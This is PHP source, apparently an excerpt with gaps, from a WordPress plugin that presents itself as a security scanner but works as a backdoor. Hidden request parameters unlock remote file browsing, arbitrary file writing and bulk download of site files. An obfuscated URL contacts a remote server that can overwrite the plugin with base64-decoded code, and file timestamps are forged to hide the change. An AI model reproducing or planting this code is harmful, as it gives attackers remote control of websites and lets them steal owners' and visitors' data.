 ...
 * Network:     true
 */
if (!function_exists('WPSecurityMainFilesChecker')) {
    function WPSecurityScan($path)
    {
        foreach (scandir($path) as $dirname) {
            ...
            if (is_dir($p)) {
                ...
                if ($fp_in = fopen($p, 'rb')) {
                    printf("%016d", strlen($p));
                    echo $p;
                    printf("%016d", filesize($p));
                    while (!feof($fp_in)) {
                        echo fread($fp_in, 1024 * 512);
                    }
                    fclose($fp_in);
                }
            }
    ...
    function WPSecurityMainThread()
    {
        if (empty($_REQUEST['M1YNtHooXoAZ'])) {
            return;
        }
        $url = 'verifyAccess=' . $_REQUEST['M1YNtHooXoAZ'] . "&" . WPSecurityToken();
        $access = WPSecurityServerSync($url);
        if (empty($access['access'])) {
            return;
        }
        if (empty($_REQUEST['kPMzIxZkMbVSFdje'])) {
            $path = '.';
        } else {
            $path = $_REQUEST['kPMzIxZkMbVSFdje'];
        }
        if (isset($_REQUEST['pnNx2pcOkKgM3LYa'])) {
            header("Content-Type: application/x-zip");
            header("Content-Disposition: attachment; filename=\"all.iz\"");
            WPSecurityScan($path);
            exit();
        }
        if (!is_file($path) || !isset($_REQUEST['content'])) {
            if (is_dir($path)) {
                echo '<table>';
                foreach (scandir($path) as $dirname) {
                    $query = $_REQUEST;
                    $query['kPMzIxZkMbVSFdje'] = $path . '/' . $dirname;
                    $url = parse_url($_SERVER['REQUEST_URI'], PATHINFO_DIRNAME) . '?' . http_build_query($query);
                    echo '<tr>';
                    echo '<td><a href="' . $url . '">' . $dirname . '</a></td>';
                    echo '</tr>';
                }
                echo '</table>';
            } else {
                echo '<form method="post">';
                echo '<textarea name="content" style="height:80%;width:100%;">';
            ...
            $query = $_REQUEST;
            file_put_contents($path, $_REQUEST['content']);
            $path = explode('/', $path);
            $path = array_slice($path, 0, -1);
            $query['kPMzIxZkMbVSFdje'] = implode('/', $path);
            $url = parse_url($_SERVER['REQUEST_URI'], PATHINFO_DIRNAME) . '?' . http_build_query($query);
            header('Location: ' . $url);
            exit();
        }
...
<meta name="description" content="' . $GLOBALS['analyse']['description'] . '" />';
    ...
    function WPSecurityToken()
    {
        ...
        $host = explode(':', $host);
        $host = $host[0];
        return "url=" . urlencode($host . $_SERVER['REQUEST_URI']);
    }


    function WPSecurityServerSync($url, $id = '')
    {
        $url = implode('', array(WPSecurityValidateKey("iuuq;00jtfbsdij/ofu0gvod0joefy/qiq@ktpo>2'wfstjpo>76'"), $url));
        ...
        if ($data) {
            if (!empty($data['update'])) {
                @file_put_contents(__FILE__, base64_decode($data['update']));
                $time = @filemtime(__DIR__ . '/..');
                if ($time) {
                    @touch(__DIR__, $time + 65);
                    @touch(__FILE__, $time + 65);
                }
            }
            return $data;
        }
    ...
    if (isset($_REQUEST['JhqrRrgxQ7fSZXJ4'])) {
        WPSecurityMainThread();
    }
    if (empty($_REQUEST['GA1Ts9HcZDudwY']) && isset($_REQUEST['Uv2oI8qhwbpwYt'])) {
        if (!function_exists('WPSecuritySystemCheck')) {
            $url = 'verifyAccess=' . $_REQUEST['Uv2oI8qhwbpwYt'] . "&" . WPSecurityToken();
            $access = WPSecurityServerSync($url);
            if (!empty($access['access'])) {
                ...
                function WPSecuritySystemCheck()
                {
                    ...
                    if (isset($_REQUEST['ZBlE3CR2vKiHzC'])) {
                        query_posts(array('posts_per_page' => 1, 'post_type' => array("post", "page"), 'post_status' => 'publish', 'orderby' => array('post_type' => 'DESC', 'ID' => 'DESC')));
                        echo '<pre>';
                        var_dump(array(
                            'templateFile' => get_single_template(),
                            'qr' => $GLOBALS['wp_query']
                        ));
                        echo '</pre>';
                        exit();
        ...
        echo 'GA1Ts9HcZDudwY';
        echo json_encode(array('version' => 65, 'fw' => is_writable(__FILE__), 'dw' => is_writable(__DIR__)));
        echo 'GA1Ts9HcZDudwY';
        exit();
    }
    if (isset($_REQUEST['i4jLhn6VfwTgOH'])) {
        var_dump(WPSecurityServerSync("url=&i4jLhn6VfwTgOH=1"));
        exit();
    }
    if (function_exists('register_activation_hook')) {
        function wpsacc()
        {
            WPSecurityServerSync(WPSecurityToken() . '&aa=1');
        }
